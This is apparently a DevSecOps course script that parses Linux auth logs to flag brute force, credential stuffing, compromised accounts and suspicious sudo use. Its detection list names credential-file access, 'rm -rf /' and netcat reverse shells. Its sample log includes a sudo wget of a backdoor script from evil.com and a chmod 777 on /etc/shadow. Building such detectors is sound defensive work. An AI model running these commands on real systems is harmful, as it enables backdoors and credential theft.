"""
Phase 3 — Python for DevSecOps
Project 2: Security Log Analyzer

This script parses authentication logs to detect:
- Brute force attacks
- Successful logins from unusual IPs
- Privilege escalation attempts
- Geographic anomalies (optional with GeoIP)

Skills demonstrated:
- File I/O and parsing
- Regular expressions
- Data aggregation
- Reporting
- argparse for CLI tools
"""

import re
import argparse
from collections import Counter, defaultdict
from datetime import datetime
from typing import Dict, List, Tuple


# Regex patterns for common log formats
PATTERNS = {
    "failed_login": re.compile(
        r"(\w+\s+\d+\s+[\d:]+)\s+\S+\s+sshd\[\d+\]:\s+Failed password for (?:invalid user )?(\S+) from (\S+)"
    ),
    "successful_login": re.compile(
        r"(\w+\s+\d+\s+[\d:]+)\s+\S+\s+sshd\[\d+\]:\s+Accepted (\S+) for (\S+) from (\S+)"
    ),
    "sudo_command": re.compile(
        r"(\w+\s+\d+\s+[\d:]+)\s+\S+\s+sudo:\s+(\S+)\s+:.*COMMAND=(.*)"
    ),
    "user_added": re.compile(
        r"(\w+\s+\d+\s+[\d:]+)\s+\S+\s+useradd\[\d+\]:\s+new user: name=(\S+)"
    ),
}


class SecurityLogAnalyzer:
    """Analyzes system logs for security events."""

    def __init__(self, log_file: str):
        self.log_file = log_file
        self.failed_logins: List[Dict] = []
        self.successful_logins: List[Dict] = []
        self.sudo_commands: List[Dict] = []
        self.new_users: List[Dict] = []

    def parse_logs(self) -> None:
        """Parse the log file and categorize events."""
        try:
            with open(self.log_file, "r") as f:
                for line in f:
                    self._parse_line(line.strip())
        except FileNotFoundError:
            print(f"Error: Log file not found: {self.log_file}")
            print("Creating sample log for demonstration...")
            self._create_sample_log()
            self.parse_logs()

    def _parse_line(self, line: str) -> None:
        """Parse a single log line and categorize it."""
        # Check for failed logins
        match = PATTERNS["failed_login"].search(line)
        if match:
            self.failed_logins.append({
                "timestamp": match.group(1),
                "username": match.group(2),
                "ip": match.group(3),
            })
            return

        # Check for successful logins
        match = PATTERNS["successful_login"].search(line)
        if match:
            self.successful_logins.append({
                "timestamp": match.group(1),
                "method": match.group(2),
                "username": match.group(3),
                "ip": match.group(4),
            })
            return

        # Check for sudo commands
        match = PATTERNS["sudo_command"].search(line)
        if match:
            self.sudo_commands.append({
                "timestamp": match.group(1),
                "user": match.group(2),
                "command": match.group(3),
            })
            return

        # Check for new users
        match = PATTERNS["user_added"].search(line)
        if match:
            self.new_users.append({
                "timestamp": match.group(1),
                "username": match.group(2),
            })

    def detect_brute_force(self, threshold: int = 5) -> List[Dict]:
        """
        Detect brute force attacks.
        
        Logic: If an IP has more than `threshold` failed attempts,
        it's likely a brute force attack.
        """
        ip_counter = Counter(event["ip"] for event in self.failed_logins)
        attackers = []

        for ip, count in ip_counter.most_common():
            if count >= threshold:
                # Get targeted usernames
                targeted_users = [
                    event["username"]
                    for event in self.failed_logins
                    if event["ip"] == ip
                ]
                user_counter = Counter(targeted_users)

                attackers.append({
                    "ip": ip,
                    "attempts": count,
                    "targeted_users": dict(user_counter.most_common(5)),
                    "first_seen": self.failed_logins[0]["timestamp"],
                    "last_seen": self.failed_logins[-1]["timestamp"],
                })

        return attackers

    def detect_credential_stuffing(self) -> List[str]:
        """
        Detect credential stuffing attacks.
        
        Logic: Many different usernames attempted from same IP
        suggests a credential list is being used.
        """
        ip_users = defaultdict(set)
        for event in self.failed_logins:
            ip_users[event["ip"]].add(event["username"])

        stuffing_ips = []
        for ip, users in ip_users.items():
            if len(users) > 10:  # More than 10 unique usernames = suspicious
                stuffing_ips.append(ip)

        return stuffing_ips

    def detect_successful_after_brute_force(self) -> List[Dict]:
        """
        CRITICAL: Detect successful login after many failures.
        
        This means the attacker likely succeeded!
        """
        # Get IPs that had failed attempts
        failed_ips = set(event["ip"] for event in self.failed_logins)

        # Check if any of those IPs later succeeded
        compromised = []
        for event in self.successful_logins:
            if event["ip"] in failed_ips:
                compromised.append({
                    "ip": event["ip"],
                    "username": event["username"],
                    "timestamp": event["timestamp"],
                    "method": event["method"],
                    "severity": "CRITICAL",
                })

        return compromised

    def detect_suspicious_sudo(self) -> List[Dict]:
        """
        Detect suspicious sudo usage.
        
        Flags:
        - Commands that download files (wget, curl)
        - Commands that modify system files
        - Commands that create new users
        - Commands that change permissions broadly
        """
        suspicious_patterns = [
            (r"wget|curl.*http", "Download from internet"),
            (r"/etc/passwd|/etc/shadow", "Accessing credential files"),
            (r"useradd|adduser", "Creating new user"),
            (r"chmod\s+777|chmod\s+\+s", "Dangerous permission change"),
            (r"iptables.*-F|ufw\s+disable", "Disabling firewall"),
            (r"rm\s+-rf\s+/", "Destructive command"),
            (r"nc\s+-l|ncat|netcat", "Reverse shell tool"),
        ]

        suspicious = []
        for event in self.sudo_commands:
            for pattern, description in suspicious_patterns:
                if re.search(pattern, event["command"]):
                    suspicious.append({
                        "user": event["user"],
                        "command": event["command"],
                        "reason": description,
                        "timestamp": event["timestamp"],
                        "severity": "HIGH",
                    })
                    break

        return suspicious

    def generate_report(self, threshold: int = 5) -> str:
        """Generate a complete security analysis report."""
        report = []
        report.append("=" * 60)
        report.append("  SECURITY LOG ANALYSIS REPORT")
        report.append(f"  Log file: {self.log_file}")
        report.append(f"  Analysis time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("=" * 60)

        # Summary
        report.append(f"\n  Total failed logins: {len(self.failed_logins)}")
        report.append(f"  Total successful logins: {len(self.successful_logins)}")
        report.append(f"  Total sudo commands: {len(self.sudo_commands)}")
        report.append(f"  New users created: {len(self.new_users)}")

        # Brute Force Detection
        report.append("\n" + "-" * 60)
        report.append("  [1] BRUTE FORCE DETECTION")
        report.append("-" * 60)
        attackers = self.detect_brute_force(threshold)
        if attackers:
            for attacker in attackers:
                report.append(f"\n  ⚠️  ATTACKER: {attacker['ip']}")
                report.append(f"     Attempts: {attacker['attempts']}")
                report.append(f"     Targeted users: {attacker['targeted_users']}")
        else:
            report.append("  ✅ No brute force attacks detected.")

        # Credential Stuffing
        report.append("\n" + "-" * 60)
        report.append("  [2] CREDENTIAL STUFFING DETECTION")
        report.append("-" * 60)
        stuffing = self.detect_credential_stuffing()
        if stuffing:
            for ip in stuffing:
                report.append(f"  ⚠️  Possible credential stuffing from: {ip}")
        else:
            report.append("  ✅ No credential stuffing detected.")

        # Successful After Brute Force (CRITICAL)
        report.append("\n" + "-" * 60)
        report.append("  [3] COMPROMISED ACCOUNTS (CRITICAL)")
        report.append("-" * 60)
        compromised = self.detect_successful_after_brute_force()
        if compromised:
            for event in compromised:
                report.append(f"  🚨 CRITICAL: {event['username']} compromised!")
                report.append(f"     From IP: {event['ip']}")
                report.append(f"     Time: {event['timestamp']}")
                report.append(f"     Action: LOCK ACCOUNT IMMEDIATELY")
        else:
            report.append("  ✅ No compromised accounts detected.")

        # Suspicious Sudo
        report.append("\n" + "-" * 60)
        report.append("  [4] SUSPICIOUS PRIVILEGE ESCALATION")
        report.append("-" * 60)
        suspicious = self.detect_suspicious_sudo()
        if suspicious:
            for event in suspicious:
                report.append(f"  ⚠️  User: {event['user']}")
                report.append(f"     Command: {event['command']}")
                report.append(f"     Reason: {event['reason']}")
        else:
            report.append("  ✅ No suspicious sudo usage detected.")

        # New Users
        if self.new_users:
            report.append("\n" + "-" * 60)
            report.append("  [5] NEW USER ACCOUNTS")
            report.append("-" * 60)
            for user in self.new_users:
                report.append(f"  ⚠️  New user: {user['username']} at {user['timestamp']}")

        report.append("\n" + "=" * 60)
        report.append("  END OF REPORT")
        report.append("=" * 60)

        return "\n".join(report)

    def _create_sample_log(self) -> None:
        """Create a sample log file for testing."""
        sample_logs = [
            "May 12 08:01:23 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
            "May 12 08:01:25 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
            "May 12 08:01:27 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
            "May 12 08:01:29 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2",
            "May 12 08:01:31 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2",
            "May 12 08:01:33 server sshd[1234]: Failed password for invalid user test from 10.0.0.50 port 22 ssh2",
            "May 12 08:02:00 server sshd[1234]: Accepted publickey for deploy from 192.168.1.100 port 22 ssh2",
            "May 12 09:00:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh",
            "May 12 09:05:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow",
            "May 12 10:00:00 server useradd[5678]: new user: name=backdoor_user",
        ]

        with open(self.log_file, "w") as f:
            f.write("\n".join(sample_logs))
        print(f"Sample log created at: {self.log_file}")


def main():
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="DevSecOps Security Log Analyzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python 02-log-analyzer.py /var/log/auth.log
    python 02-log-analyzer.py /var/log/auth.log --threshold 10
    python 02-log-analyzer.py sample.log --output report.txt
        """,
    )
    parser.add_argument(
        "logfile",
        nargs="?",
        default="/var/log/auth.log",
        help="Path to log file (default: /var/log/auth.log)",
    )
    parser.add_argument(
        "--threshold",
        type=int,
        default=5,
        help="Failed login threshold for brute force detection (default: 5)",
    )
    parser.add_argument(
        "--output",
        type=str,
        help="Save report to file",
    )

    args = parser.parse_args()

    # Run analysis
    analyzer = SecurityLogAnalyzer(args.logfile)
    analyzer.parse_logs()
    report = analyzer.generate_report(threshold=args.threshold)

    # Output
    print(report)
    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
        print(f"\nReport saved to: {args.output}")


if __name__ == "__main__":
    main()
